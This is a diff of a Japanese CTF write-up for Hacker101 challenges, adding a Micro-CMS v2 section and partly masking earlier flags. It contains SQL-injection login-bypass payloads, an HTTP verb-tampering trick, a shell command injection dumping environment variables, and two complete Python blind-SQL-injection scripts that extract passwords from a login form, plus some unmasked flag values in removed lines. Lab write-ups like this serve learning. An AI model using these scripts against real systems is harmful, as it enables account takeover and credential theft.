@@ -1630,11 +1630,12 @@ def create_2tansaku_query(md,i,times):
     return query
 ```
 このInvisibleがフラグらしい……。（FLAG形式じゃないやないか…（怒））  
+ちなみに以下は完全なFlagじゃないです。ちょっと隠してます。  
 ```txt
 [-] exploit finished
 Utterly adorable:files/adorable.jpg:1
 Purrfect:files/purrfect.jpg:1
-Invisible:b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674:1
+Invisible:b92cc0e3169????????036b499674:1
 ```
 ```python
 database = "level5"
@@ -1672,7 +1673,7 @@ $GALLERY$ ''' def getDb(): return MySQLdb.connect(host="localhost", user="root",
 
 %s
 ' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
-\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404) # It's dangerous to go alone, take this: # ^FLAG^59540711ea6225ea8310897c6baa3a11b287c7e8dcad02a1bb2b3275666ec6b5$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
+\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404) # It's dangerous to go alone, take this: # ^FLAG^59540711ea6225ea87c7e????????????b3275666ec6b5$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
 ```
 ### flag1 (blind Injection)
 ```python
@@ -1697,7 +1698,7 @@ def create_2tansaku_query(md,i,times):
 [-] exploit finished
 Utterly adorable:files/adorable.jpg:1
 Purrfect:files/purrfect.jpg:1
-Invisible:b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674:1
+Invisible:b92cc0e5d5c3269??????????92036b499674:1
 ```
 ### flag2 (Stack query / OS Command Injection)
 `printenv`で環境変数を見ればいいらしい。  
@@ -1751,9 +1752,9 @@ Space used: /bin/sh: 1: echoPYTHONIOENCODING=UTF-8: not found
 ```txt
 PYTHONIOENCODING=UTF-8 UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi 
 SUPERVISOR_GROUP_NAME=uwsgi FLAGS=
-["^FLAG^59540711ea6225ea8310897c6baa3a11b287c7e8dcad02a1bb2b3275666ec6b5$FLAG$", 
-"^FLAG^b92cc0e313bc00b1548c0563c26f15d5c32690694e49707ed32192036b499674$FLAG$", 
-"^FLAG^aa435df54317de31f5da65f7fd430f78ebcdc51825f124624b232cf00b367efe$FLAG$"] 
+["^FLAG^59540711ea6225e?????????66ec6b5$FLAG$", 
+"^FLAG^b92cc0e313bc00694e49??????????2036b499674$FLAG$", 
+"^FLAG^aa435df54378ebcdc51825??????????f00b367efe$FLAG$"] 
 HOSTNAME=0afaf3213fe1 SHLVL=0 PYTHON_PIP_VERSION=18.1 HOME=/root 
 GPG_KEY=C01E1CAD5EA2C4F0B8E3571504C367C218ADD4FF UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 
 UWSGI_PROCESSES=16 STATIC_URL=/static UWSGI_CHEAPER=2 NGINX_VERSION=1.13.12-1~stretch 
@@ -1762,6 +1763,202 @@ NJS_VERSION=1.13.12.0.2.0-1~stretch LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VER
 NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock 
 SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app STATIC_PATH=/app/static 
 PYTHONPATH=/app UWSGI_RELOADS=0
+```
+## Micro-CMS v2
+https://katsuwosashimi.com/archives/620/hacker101-ctf-micro-cms-v2/  
+### login bypass "' union select '1" "1" /  (flag0)
+ログインフォームで`' or 1=1`を入力すると以下のようなエラーが出力される。よって、flaskで書かれたサイトで、MariaDBを使っていることがわかる。  
+また、`SELECT password FROM admins WHERE username=\'%s\'`となっており、`%`という文字が'%%'にエスケープされることがわかる。  
+```txt
+Traceback (most recent call last):
+  File "./main.py", line 145, in do_login
+    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
+    self.errorhandler(self, exc, value)
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
+    raise errorvalue
+ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1")
+```
+username=`' union select '1`,password=`1`を入力すると条件をクリアしてログインできる！  
+これでSecret Pageにアクセスでき、中にFlagが書いてある。  
+ちなみに、自力でやったときはこのやり方じゃなくてBlindで普通にusernameとpasswordを特定してログインしてFlag2が先に出力された。そのあとDBをダンプしてSecret PageについてのデータをDatabaseから取り出してFlag0をゲットした。  
+### HTTP Verb Tampering (flag1)
+**HTTP Verb Tampering**というGETの代わりにPOSTをいれて、アクセスが禁止されているページにPOSTでアクセスするみたいな攻撃手法を使う。  
+`/page/edit/1`に対して通常のGETでアクセスすると、loginページにリダイレクトするが、POSTに書き直してアクセスするとFlag1が得られた！  
+### MySQL / blind Injection / identify password (flag2)
+ログインフォームで以下からBlindができることがわかる！  
+ログインできればFlag2ゲット！  
+```txt
+' or 1 and 1=1 #
+Invalid password
+
+' or 1 and 1=2 #
+Unknown user
+```
+よって以下のスクリプトでpasswordを特定できた！  
+```python
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+
+import os
+import requests
+import urllib.parse
+
+url = "http://35.190.155.168/b77586a1e8/login"
+cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
+candidates = [chr(i) for i in range(48, 48+10)] + \
+    [chr(i) for i in range(97, 97+26)] + \
+    [chr(i) for i in range(65, 65+26)] + \
+    [".","-","+","_",":","<",">",";","'","\"","(",")","=","{","}","[","]","\\","|","/","@","$","!","?","&","#"]
+headers= {'Cookie':'PHPSESSID='+cookie}
+
+def attack(attack_sql):
+    attack_url = url
+    data = "username=" + urllib.parse.quote(attack_sql) + "&password=" + urllib.parse.quote("pass")
+    #print(data)
+    headers.update([('Content-Type','application/x-www-form-urlencoded')])
+    res = requests.post(attack_url, headers=headers,verify=False,data=data)
+    #print(res.text)
+    return res
+
+def create_pass_query(pw):
+    # ' or 1 and substr(pass,1,1)='f' -- -
+    query = "' or 1 and substr(username," + str(len(pw)) + ",1)='"+pw[-1]+"' limit 2,1 -- -"
+    print(query)
+    return query
+
+def check_result(res):
+    if 'Invalid password' in res.text:
+        return True
+    return False
+
+####################
+###     main     ###
+####################
+
+# find pw
+fix_pass = ""
+is_end = False
+while not is_end:
+    for c in candidates:
+        try_pass = fix_pass + str(c)
+        print(try_pass)
+        query = create_pass_query(try_pass)
+        res = attack(query)
+        if check_result(res):
+            fix_pass += c
+            break
+        if c == '#':
+            is_end = True
+            
+
+print("result: " + fix_pass)
+```
+binary search版は以下。  
+```python
+#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+
+import os
+import requests
+import urllib.parse
+import urllib3
+from urllib3.exceptions import InsecureRequestWarning
+urllib3.disable_warnings(InsecureRequestWarning)
+
+url = "http://35.190.155.168/b77586a1e8/login"
+cookie = "d8iuvjr50tjvrmaj2gf97ts6bl"
+headers= {'Cookie':'PHPSESSID='+cookie}
+
+def attack(attack_sql):
+    attack_url = url
+    data = "username=" + urllib.parse.quote(attack_sql) + "&password=" + urllib.parse.quote("pass")
+    #print(data)
+    headers.update([('Content-Type','application/x-www-form-urlencoded')])
+    res = requests.post(attack_url, headers=headers,verify=False,data=data)
+    #print(res.text)
+    return res
+
+
+def create_length_query(md,times):
+    # ' or 1 and substr(pass,1,1)='f' -- -
+    query = "' or 1 and if(length(password) >= " + str(md) + ",1=1,1=3)#"
+   # print(query)
+    return query
+
+def create_2tansaku_query(md,i,times):
+    query = "' or 1 and if(ascii(substr(password," +str(i) + ",1)) >= " + str(md) + ",1=1,1=3)#"
+   # print(query)
+    return query
+
+
+def check_result(res):
+    if 'Invalid password' in res.text:
+        return True
+    return False
+
+####################
+###     main     ###
+####################
+
+def exploit_length(times):
+    ok = 0
+    ng = 100
+    while ok + 1 != ng:
+        md = (ok + ng) // 2
+        print("    [+] try " + str(md) + "  times:" + str(times))
+        query = create_length_query(md,times)
+        res = attack(query)
+        if check_result(res):
+            ok = md
+        else:
+            ng = md
+    print("")
+    print("length: " + str(ok) + "  " +str(times) + " times")
+    print("")
+    return ok
+        
+def exploit_2tansaku(length,times):
+    fix_pass = ""
+    for i in range(0,length):
+        ok = 0
+        ng = 127
+        while ok + 1!= ng:
+            md = (ok + ng) // 2
+            print("    [+] try " + str(md) + "  i: " + str(i) + "  times:" + str(times))
+            query = create_2tansaku_query(md,i+1,times)
+            res = attack(query)
+            if check_result(res):
+                ok = md
+            else:
+                ng = md
+        fix_pass += str(chr(ok))
+        print("")
+        print("progress: " + str(i+1) +"/" + str(length))
+        print("result: " + fix_pass)
+        print("")
+    return fix_pass
+
+#length = exploit_length()
+#length = 24
+#exploit_2tansaku(int(length))
+
+result = []
+loop_times = 100
+
+for i in range(loop_times):
+    print("[*] " + str(i) + " times")
+    print("")
+    length = exploit_length(i)
+    res = exploit_2tansaku(length,i)
+    if(res == ""):
+        print("[-] fix_pass is None. loop break")
+        break
+    result.append(res)
+
+print("")
+print("[-] exploit finished")
+[print(a) for a in result]
 ```
 # メモ
 https://www.hamayanhamayan.com/entry/2020/06/25/222618  
